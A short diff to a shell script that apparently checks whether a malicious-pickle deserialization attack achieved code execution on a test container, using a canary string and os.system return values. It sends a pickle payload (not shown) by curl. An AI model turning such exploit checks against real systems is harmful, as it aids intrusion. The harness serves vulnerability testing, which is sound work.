@@ -30,15 +30,11 @@ echo "---raw---"
 if [ -n "$PICKLE_ID" ]; then
   resp=$(curl -sS --max-time 4 -X POST "$BASE" --data-urlencode "data=$PICKLE_ID" 2>&1) || true
   echo "MALICIOUS_PICKLE response: ${resp:0:300}"
-  # Check if the command executed by looking at return value
-  if echo "$resp" | grep -qE '"type":\s*"int"|"value":\s*"0"'; then
-    echo "PICKLE_RCE: os.system returned 0 (command executed)"
+  if echo "$resp" | grep -qF 'CANARY_DESER_9a1f7b'; then
+    echo "PICKLE_RCE: canary found in deserialization response"
     SUCCESS=0
-  fi
-  # Also verify by exec-ing into container to check /tmp/pwned.txt
-  pwned=$(docker exec "${TARGET_CONTAINER:-autopatch-target}" cat /tmp/pwned.txt 2>&1) || true
-  if echo "$pwned" | grep -qE 'uid=[0-9]+\('; then
-    echo "PICKLE_RCE_CONFIRMED: /tmp/pwned.txt contains uid output"
+  elif echo "$resp" | grep -qE '"type":\s*"int"|"value":\s*"0"'; then
+    echo "PICKLE_RCE: os.system returned 0 (command executed)"
     SUCCESS=0
   fi
 fi
